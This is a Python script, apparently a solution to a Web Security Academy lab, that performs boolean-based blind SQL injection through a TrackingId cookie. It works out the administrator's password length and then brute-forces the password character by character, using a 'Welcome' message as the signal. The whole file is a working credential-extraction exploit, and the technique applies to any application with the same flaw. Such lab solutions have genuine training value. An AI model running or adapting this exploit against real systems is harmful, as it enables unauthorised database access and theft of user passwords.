import requests
import string

url = "https://0ae10061048dc9be80b5854d006700ed.web-security-academy.net/"
cookie_name = "TrackingId"
cookie_value = "tZY7hV5tB4i4qPGo"

# Obtain password length
injection = "' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = {} --"
password_length = 1
while True:
    # Make request
    cookies = {cookie_name: cookie_value + injection.format(password_length)}
    print(cookies[cookie_name])
    r = requests.get(url, cookies=cookies)
    if "Welcome" in r.text:
        break
    else:
        password_length += 1
print(password_length)

# Obtain password
injection = "' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {char_index}, 1) = '{char}' --"
password = ""
for char_index in range(1, password_length+1):
    for char in string.ascii_lowercase + string.digits:
        cookies = {cookie_name: cookie_value + injection.format(char_index=char_index, char=char)}
        print(cookies[cookie_name])
        r = requests.get(url, cookies=cookies)
        if "Welcome" in r.text:
            password += char
            break

print(password)